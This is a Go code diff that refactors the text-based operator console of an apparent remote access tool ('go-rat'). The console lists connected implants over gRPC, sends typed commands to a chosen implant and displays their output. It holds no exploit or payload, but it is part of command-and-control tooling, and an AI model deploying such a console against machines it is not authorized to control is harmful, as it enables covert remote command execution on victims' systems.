@@ -4,9 +4,7 @@ import (
 	"context"
 
 	"github.com/charmbracelet/bubbles/key"
-	"github.com/charmbracelet/bubbles/textinput"
 	tea "github.com/charmbracelet/bubbletea"
-	"github.com/charmbracelet/log"
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
@@ -27,22 +25,33 @@ import (
 type (
 	GoBackMsg bool
 	// Modes
-	mode int8
+	Mode int
 )
 
 const (
-	PromptImplant mode = iota
+	// PromptImplant Mode = iota
+	Default Mode = iota
 	SelectImplant
+	PromptImplant
+	// PromptReady
+	CmdOutRecived
+	Error
 )
 
-func (m mode) String() string {
+func (m Mode) String() string {
 	switch m {
 	case PromptImplant:
-		return "Implant Prompt"
+		return "Introducir comando para implant"
+		// return "Generando linea de comandos para implant"
+	// case PromptReady:
 	case SelectImplant:
-		return "Select Implant"
+		return "Seleccionar Implant"
+	case CmdOutRecived:
+		return "Resultado Recibido"
+	case Default:
+		return "Por defecto"
 	}
-	return "unknown"
+	return "desconocido"
 }
 
 // app
@@ -52,99 +61,109 @@ type AppKeyMap struct {
 }
 
 type ClientApp struct {
-	Menu   *MenuModel
-	Prompt textinput.Model
-	State  mode
+	Menu   MenuModel
+	Prompt PromptModel
+	State  Mode
 	KeyMap AppKeyMap
 	Client grpcapi.AdminClient
+	Ctx    context.Context
+	Cmd    *grpcapi.Command
+	Err    error
 }
 
-func (a *ClientApp) Init() tea.Cmd {
-	a.FetchImplants()
-	return nil
+func (a ClientApp) Init() tea.Cmd {
+	return a.FetchImplants
 }
 
-func (a *ClientApp) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
+func (a ClientApp) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 	var cmds []tea.Cmd
-
 	switch _msg := msg.(type) {
 	case tea.KeyMsg:
 		switch {
 		case key.Matches(_msg, a.KeyMap.CtrlC):
 			return a, tea.Quit
 		}
+	case MenuMsg:
+		a.Menu = _msg.Menu
+		a.State = SelectImplant
 	case SelectMsg:
+		a.Prompt = NewPromptModel(_msg.Implant)
+		cmds = append(cmds, PromptReady)
+		return a, tea.Batch(cmds...)
+	case PromptReadyMsg:
 		a.State = PromptImplant
-
+		return a, a.Prompt.Ti.Focus()
 	case GoBackMsg:
 		if a.State == SelectImplant {
 			return a, tea.Quit
 		}
 		a.State = SelectImplant
+	case SendCmdMsg:
+		a.Cmd.In = _msg.Input
+		a.Cmd.Id = _msg.ID
+		cmds = append(cmds, a.SendCommand)
+		return a, tea.Batch(cmds...)
+	case RecvCmdMsg:
+		a.State = CmdOutRecived
+		if _msg.Err != nil {
+			a.Err = _msg.Err
+			a.State = Error
+		}
 	}
 	switch a.State {
 	case SelectImplant:
 		m, cmd := a.Menu.Update(msg)
-		newMenu, ok := m.(*MenuModel)
+		newMenu, ok := m.(MenuModel)
 		if !ok {
-			log.Fatal("Bad assertion", "menu", m)
+			logger.Fatal("Bad assertion", "menu", m)
 		}
 		a.Menu = newMenu
 		cmds = append(cmds, cmd)
 		return a, tea.Batch(cmds...)
-		// case PromptImplant:
-		// 	m, cmd := a.Menu.Update(msg)
-		// 	newMenu, ok := m.(MenuModel)
-		// 	if !ok {
-		// 		log.Fatal("Bad assertion", "menu", m)
-		// 	}
-		// 	a.Menu = newMenu
-		// 	cmds = append(cmds, cmd)
-		// 	return a, tea.Batch(cmds...)
-	default:
-		a.FetchImplants()
-		logger.Info(a)
+	case PromptImplant:
+		p, cmd := a.Prompt.Update(msg)
+		newPrompt, ok := p.(PromptModel)
+		if !ok {
+			logger.Fatal("Bad assertion", "prompt", p)
+		}
+		a.Prompt = newPrompt
+		cmds = append(cmds, cmd)
+		return a, tea.Batch(cmds...)
+	case CmdOutRecived:
+		cmds = append(cmds, PromptReady)
+		return a, tea.Batch(cmds...)
+	case Error:
+		a.State = Default
+		return a, nil
 	}
 	return a, nil
 }
 
-func (a *ClientApp) View() string {
+func (a ClientApp) View() string {
+	if a.Err != nil {
+		return a.Err.Error()
+	}
 	switch a.State {
 	case SelectImplant:
 		return a.Menu.View()
 	case PromptImplant:
 		return a.Prompt.View()
+	case CmdOutRecived:
+		return a.Prompt.View() + "\n" + a.Cmd.Out
 	}
 	return ""
 }
 
-func (a *ClientApp) FetchImplants() tea.Msg {
-	var (
-		ctx   = context.Background()
-		items []string
-	)
-	availableImplants, err := a.Client.GetImplants(ctx, nil)
-	if err != nil {
-		logger.Fatal(err)
-	}
-	for _, v := range availableImplants.Implants {
-		logger.Debug(v.Id)
-		items = append(items, v.Id)
-	}
-	a.Menu = initMenu(items, 0)
-	a.State = SelectImplant
-	return nil
-}
-
-func NewClientApp(conn *grpc.ClientConn) *ClientApp {
+func NewClientApp(conn *grpc.ClientConn) ClientApp {
 	_keymap := AppKeyMap{
 		CtrlC: key.NewBinding(key.WithKeys("ctrl+c"), key.WithHelp("Ctrl C", "Force Quit")),
 	}
-	a := &ClientApp{
-		Prompt: textinput.Model{},
+	a := ClientApp{
 		Client: grpcapi.NewAdminClient(conn),
+		Ctx:    context.Background(),
+		Cmd:    new(grpcapi.Command),
+		State:  Default,
 		KeyMap: _keymap,
-		// State:  SelectImplant,
 	}
 	return a
 }
@@ -154,17 +173,17 @@ func main() {
 		opts []grpc.DialOption
 		conn *grpc.ClientConn
 		err  error
-		app  *ClientApp
+		app  ClientApp
 	)
 	opts = append(opts, grpc.WithTransportCredentials(insecure.NewCredentials()))
 	conn, err = grpc.NewClient("127.0.0.1:9090", opts...)
 	if err != nil {
-		log.Fatal("[!] No se pudo establecer conexión con el servidor principal.", "ERROR", err)
+		logger.Fatal("[!] No se pudo establecer conexión con el servidor principal.", "ERROR", err)
 	}
 	defer conn.Close()
 	app = NewClientApp(conn)
 	p := tea.NewProgram(app)
 	if _, err = p.Run(); err != nil {
-		log.Fatal("Ocurrió un error en la ejecución del programa.", "error", err)
+		logger.Fatal("Ocurrió un error en la ejecución del programa.", "error", err)
 	}
 }
